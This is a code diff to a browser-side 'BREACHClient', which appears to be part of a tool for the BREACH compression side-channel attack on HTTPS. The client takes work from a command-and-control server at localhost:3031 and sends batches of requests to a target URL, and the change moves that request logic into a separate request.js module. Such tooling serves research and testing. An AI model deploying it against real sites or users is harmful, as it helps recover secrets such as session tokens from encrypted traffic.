@@ -1,4 +1,5 @@
-const io = require('socket.io-client');
+const io = require('socket.io-client'),
+      req = require('./request.js');
 
 var BREACHClient = {
     COMMAND_CONTROL_URL: 'http://localhost:3031/',
@@ -43,47 +44,15 @@ var BREACHClient = {
                 work: work,
                 success: success,
                 host: window.location.host
-            }, gotWork);
+            });
         }
-        const allCompleted = () => {
-            reportCompletion(true);
-        }
-        const reportProblem = () => {
-            reportCompletion(false);
-        }
-        var imgs = [];
-        var loadingTimeout;
-
-        const resetTimeout = () => {
-            clearTimeout(loadingTimeout);
-            loadingTimeout = setTimeout(() => {
-                for (var i = 0; i < amount; ++i) {
-                    imgs[i].src = '';
-                }
-                reportProblem();
-            }, this.ONE_REQUEST_TIMEOUT);
-        }
-        const oneLoaded = (imageIndex) => {
-            console.log();
-
-            resetTimeout();
-            console.log('Loaded image: ' + imageIndex);
-            ++loadedCount;
-
-            if (loadedCount == amount) {
-                allCompleted();
-            }
-        }
-        for (var i = 0; i < amount; ++i) {
-            var img = new Image();
-            console.log('Making request to ' + url);
-            img.src = url;
-            img.onerror = () => {
-                oneLoaded(i);
-            };
-            imgs.push(img);
-        }
-        resetTimeout();
+        req.Collection.create(
+            url,
+            {amount: amount},
+            function() {},
+            reportCompletion.bind(this, true),
+            reportCompletion.bind(this, false)
+        );
     },
     getWork() {
         console.log('Getting work');
